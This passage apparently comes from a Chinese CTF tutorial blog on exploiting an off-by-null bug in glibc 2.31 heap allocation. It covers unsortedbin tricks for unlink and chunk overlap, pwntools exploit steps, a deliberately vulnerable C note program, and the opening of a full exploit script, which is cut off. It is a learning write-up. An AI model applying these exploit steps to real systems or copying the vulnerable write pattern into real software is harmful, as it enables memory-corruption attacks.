title="一个问题"></a>一个问题</h4><p>在步骤3中是这样描述的</p><blockquote><p>把victim申请回来。再伪造prev_size, off by null填充size 的prev_inuse位。</p></blockquote><p>但实际上我们的目标是修改victim的prev_inuse位和prev_size,这是要通过victim的上一个相邻chunk做到的</p><p>但在这个prev是已经布置好了的,显然再次操作prev会破坏prev的结构</p><p>所以个人认为在这里是存在一些问题的,即不对应实操环境</p><h5 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h5><p>解决也简单</p><p>原本的步骤2prev放入之前就应该已经完成构造victim的prev_size并修改prev_inuse位</p><p>此后除最后的free外不再对victim进行操作</p><p>至于步骤3中设置a-&gt;bk,额外再申请一个chunk辅助即可</p><h3 id="爆破法-改进版"><a href="#爆破法-改进版" class="headerlink" title="爆破法(改进版)"></a>爆破法(改进版)</h3><p>在上述基础上,如果程序读取输入时<strong>不会将 <code>\n</code>替换<code>\x00</code></strong>，也能做不爆破的利用。(不是很懂为什么要这个条件,按照个人理解不满足这个条件也是可以的)</p><p><strong>重点就是利用向低地址合并来规避unsorted取出时对fd的破坏</strong></p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>伪造一个chunk p，其中size按布局来调整。</p><p>通过unsortedbin构造p-&gt;fd, p-&gt;bk。利用unsortedbin+ 部分写构造出 fd-&gt;bk=p 、bk-&gt;fd=p。</p><p>同时解决难点1和难点2：通过后向(低地址)合并，<strong>把构造好的fd和bk指针保留下来</strong>。这样从unsortedbin中取出来时，就不会破坏这个fd。并且fd存在于chunk内部而不是紧接着chunk metedata，这样就可以部分写入1个0字节到fd。</p><h4 id="大体布局"><a href="#大体布局" class="headerlink" title="大体布局"></a>大体布局</h4><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/47a691c8-a223-47a4-bcd1-e50b6860cdc1.png" alt=""></p><p>目标是让H1可以合并C0：</p><ol><li>C0满足unlink条件构造。即 D&lt;-&gt;C0&lt;-&gt;A 双向链表 （不需要设置 D-&gt;bk和A-&gt;fd）</li><li>C0. size == H1.prev_size</li></ol><h4 id="具体流程-1"><a href="#具体流程-1" class="headerlink" title="具体流程"></a>具体流程</h4><h5 id="步骤1-申请chunk-最低字节对齐"><a href="#步骤1-申请chunk-最低字节对齐" class="headerlink" title="步骤1 申请chunk 最低字节对齐"></a>步骤1 申请chunk 最低字节对齐</h5><p>申请A, barrier，B0 , C0，barrier，H0，D，barrier。其中C0就是要伪造的chunk p，地址对齐为0x00结尾,无需爆破。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step1 P&amp;0xff = 0</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x418</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x100</span>) <span class="comment">#0 A = P-&gt;fd</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x108</span>) <span class="comment">#1 barrier</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x438</span>, <span class="string">&quot;B0&quot;</span>*<span class="number">0x100</span>) <span class="comment">#2 B0 helper</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x438</span>, <span class="string">&quot;C0&quot;</span>*<span class="number">0x100</span>) <span class="comment">#3 C0 = P , P&amp;0xff = 0</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x108</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">0x100</span>) <span class="comment">#4 barrier</span></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x488</span>, <span class="string">&quot;H&quot;</span>*<span class="number">0x100</span>) <span class="comment"># H0. helper for write bk-&gt;fd. vitcim chunk.</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x428</span>, <span class="string">&quot;D&quot;</span>*<span class="number">0x100</span>) <span class="comment"># 6 D = P-&gt;bk</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x108</span>) <span class="comment"># 7 barrier</span></span><br></pre></td></tr></table></figure><h5 id="步骤2-设置C0-gt-fd-A，C0-gt-bk-D，C0-size-0x551"><a href="#步骤2-设置C0-gt-fd-A，C0-gt-bk-D，C0-size-0x551" class="headerlink" title="步骤2 设置C0-&gt;fd=A，C0-&gt;bk=D，C0.size=0x551"></a>步骤2 设置C0-&gt;fd=A，C0-&gt;bk=D，C0.size=0x551</h5><p>释放A, C0, D。此时unsortedbin: D-&gt;C0-&gt;A。</p><p>通过释放B0，让B0和C0合并成BC，从而保存构造好fake chunk指针：C0-&gt;fd、C0-&gt;bk。</p><p>发生改变的地方用红色标出。之前的改变用绿色标出。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/ed609493-bcd8-4ac9-b2f5-d7dbb0326cd8.png" alt=""></p><p>申请B1，分割BC。B1.size = B0.size+0x20， 此时可以把C0的size改成0x551。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/399d6539-a37d-4580-9a5a-e4727e6f91fc.png" alt=""></p><p>再把剩下的C1、 D、 A申请回来。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 2 use unsortedbin to set p-&gt;fd =A , p-&gt;bk=D</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># A</span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># C0</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># D</span></span><br><span class="line"><span class="comment"># unsortedbin: D-C0-A   C0-&gt;FD=A</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># merge B0 with C0. preserve p-&gt;fd p-&gt;bk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x458</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x438</span> + p64(<span class="number">0x551</span>)[:-<span class="number">2</span>])  <span class="comment"># put A,D into largebin, split BC. use B1 to set p-&gt;size=0x551</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># recovery</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>)  <span class="comment"># C1 from ub</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x428</span>)  <span class="comment"># bk  D  from largebin</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x418</span>,<span class="string">&quot;0&quot;</span>*<span class="number">0x100</span>)  <span class="comment"># fd    A from largein</span></span><br></pre></td></tr></table></figure><h5 id="步骤3-设置A-gt-bk-p"><a href="#步骤3-设置A-gt-bk-p" class="headerlink" title="步骤3 设置A-&gt;bk=p"></a>步骤3 设置A-&gt;bk=p</h5><p>释放A 、C1，此时unsortedbin: C1-&gt;A。再取出A、C1，就可以部分写A-&gt;bk 为 C0。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step3 use unsortedbin to set fd-&gt;bk</span></span><br><span class="line"><span class="comment"># partial overwrite fd -&gt; bk </span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># A=P-&gt;fd</span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># C1</span></span><br><span class="line"><span class="comment"># unsortedbin: C1-A ,   A-&gt;BK = C1</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)  <span class="comment"># 2 partial overwrite bk    A-&gt;bk = p</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x418</span>)   </span><br></pre></td></tr></table></figure><h5 id="步骤4-设置B-gt-fd-p"><a href="#步骤4-设置B-gt-fd-p" class="headerlink" title="步骤4 设置B-&gt;fd=p"></a>步骤4 设置B-&gt;fd=p</h5><p>释放C1，D，此时unsortedbin: D-&gt;C1。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/7f91e2f2-fb94-4aae-bbfe-095c40ebb778.png" alt=""></p><p>再释放H，让H和D合并成HD，这样就可以保存构造好的D-&gt;fd 。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2e755921-c517-4244-b4f5-b369caaf9fef.png" alt=""></p><p>通过H1部分写D-&gt;fd为C0。这样做的好处在于可以只部分写1个0字节，即解决难点1。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/6b9f51a3-c03a-4529-9eca-987e3a34eb3c.png" alt=""></p><p>此时就已经完成了unlink条件的构造。</p><p>最后再把剩下的内容申请出来。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step4 use ub to set bk-&gt;fd</span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># C1</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># D=P-&gt;bk</span></span><br><span class="line"><span class="comment"># ub-D-C1    D-&gt;FD = C1</span></span><br><span class="line">delete(<span class="number">5</span>) <span class="comment"># merge D with H, preserve D-&gt;fd </span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>-<span class="number">8</span>, <span class="string">&#x27;6&#x27;</span>*<span class="number">0x488</span> + p64(<span class="number">0x431</span>)) <span class="comment"># H1. bk-&gt;fd = p, partial write \x00</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x3b0</span>) <span class="comment"># recovery</span></span><br></pre></td></tr></table></figure><h5 id="步骤5-伪造prev-size和prev-inuse-1"><a href="#步骤5-伪造prev-size和prev-inuse-1" class="headerlink" title="步骤5 伪造prev_size和prev_inuse"></a>步骤5 伪造prev_size和prev_inuse</h5><p>最后通过H1上方的barrier，off by null设置H1.prev_size = 0x550, H1.prev_inuse=0。就完成了最终布局。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/8fa229a3-4ccb-4f15-b4a0-1a0c15e340aa.png" alt=""></p><p>释放H1，则完成overlap。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step5 off by null</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x100</span>*<span class="string">&#x27;4&#x27;</span> + p64(<span class="number">0x550</span>))<span class="comment"># off by null, set fake_prev_size = 0x550, prev inuse=0</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># merge H1 with C0. trigger overlap C0,4,6</span></span><br></pre></td></tr></table></figure><p>overlap之后就是常规的leak libc，打tcache。</p><h4 id="demo代码"><a href="#demo代码" class="headerlink" title="demo代码"></a>demo代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="type">long</span> *point;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">&#125;chunks[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="keyword">if</span>(index&gt;=<span class="number">9</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong index!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(chunks[index].point)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;already exist!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;size);</span><br><span class="line">    chunks[index].point=<span class="built_in">malloc</span>(size);</span><br><span class="line">    chunks[index].size=size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!chunks[index].point)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;malloc error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p=chunks[index].point;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">    p[read(<span class="number">0</span>,chunks[index].point,chunks[index].size)]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="keyword">if</span>(index&gt;=<span class="number">9</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong index!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!chunks[index].point)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s blank!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(chunks[index].point);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="keyword">if</span>(index&gt;=<span class="number">9</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong index!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!chunks[index].point)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s blank!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> *p=chunks[index].point;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">    p[read(<span class="number">0</span>,chunks[index].point,chunks[index].size)]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="keyword">if</span>(index&gt;=<span class="number">9</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong index!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!chunks[index].point)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s blank!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunks[index].point);</span><br><span class="line">    chunks[index].point=<span class="number">0</span>;</span><br><span class="line">    chunks[index].size=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;(1) add a chunk&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;(2) show content&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;(3) edit a chunk&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;(4) delete a chunk&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> choice;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to new school note.&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">        <span class="keyword">switch</span>(choice)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                add();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                edit();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                delete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="完整exp-glibc2-31，ubuntu20-04"><a href="#完整exp-glibc2-31，ubuntu20-04" class="headerlink" title="完整exp(glibc2.31，ubuntu20.04)"></a>完整exp(glibc2.31，ubuntu20.04)</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># functions for quick script</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)        </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>,timeout=<span class="number">2</span>:p.recv(numb, timeout=timeout)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop) <span class="comment"># by default, drop is set to false</span></span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) <span class="comment"># to get 8 byte addr </span></span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"><span class="comment"># gdb debug</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p,a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line"></span><br><span class="line"><span class="comment"># basic config</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">elf_path    = <span class="string">&quot;off_by_null_raw&quot;</span></span><br><span class="line"><span class="comment">#libc       = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf     = ELF(elf_path)</span><br><span class="line">libc    = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        p = process(elf_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10005</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">elect</span>):  </span><br><span class="line">    sla(<span class="string">&#x27;&gt;&#x27;</span>,<span 